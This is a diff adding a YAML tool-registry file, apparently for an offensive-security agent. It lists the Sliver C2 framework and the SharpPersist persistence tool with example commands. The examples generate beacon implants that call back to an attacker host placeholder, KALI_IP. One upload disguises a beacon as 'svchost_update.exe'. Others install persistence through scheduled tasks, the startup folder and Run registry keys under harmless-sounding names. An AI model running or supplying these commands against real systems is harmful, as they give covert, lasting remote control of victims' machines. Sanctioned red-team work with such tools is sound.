@@ -1,0 +1,25 @@
+sliver:
+  description: "Sliver C2 — deploys persistent beacons and manages session lifecycle"
+  category: c2
+  verify_cmd: "sliver version"
+  examples:
+    - "sliver > generate beacon --mtls KALI_IP:8888 --os windows --seconds 60 --jitter 30 --reconnect 300 --save /tmp/beacon.exe"
+    - "sliver > generate --mtls KALI_IP:8888 --os linux --format shared-lib --save /tmp/libupdate.so"
+    - "sliver [session] > upload /tmp/beacon.exe C:\\Windows\\Temp\\svchost_update.exe"
+    - "sliver > beacons"
+
+sliver-client:
+  description: "Sliver operator client"
+  category: c2
+  verify_cmd: "sliver-client version"
+  examples:
+    - "sliver-client --config /opt/sliver/configs/kali-operator.cfg"
+
+sharppersist:
+  description: "Windows persistence installer — supports multiple techniques"
+  category: persistence
+  verify_cmd: "test -f /opt/tools/SharpPersist.exe && echo OK"
+  examples:
+    - "sliver [session] > execute-assembly /opt/tools/SharpPersist.exe -- -t schtask -c 'C:\\path\\beacon.exe' -n 'UpdateCheck' -m add"
+    - "sliver [session] > execute-assembly /opt/tools/SharpPersist.exe -- -t startupfolder -c 'C:\\path\\beacon.exe' -f 'Update' -m add"
+    - "sliver [session] > execute-assembly /opt/tools/SharpPersist.exe -- -t reg -c 'C:\\path\\beacon.exe' -k 'hkcurun' -v 'Update' -m add"
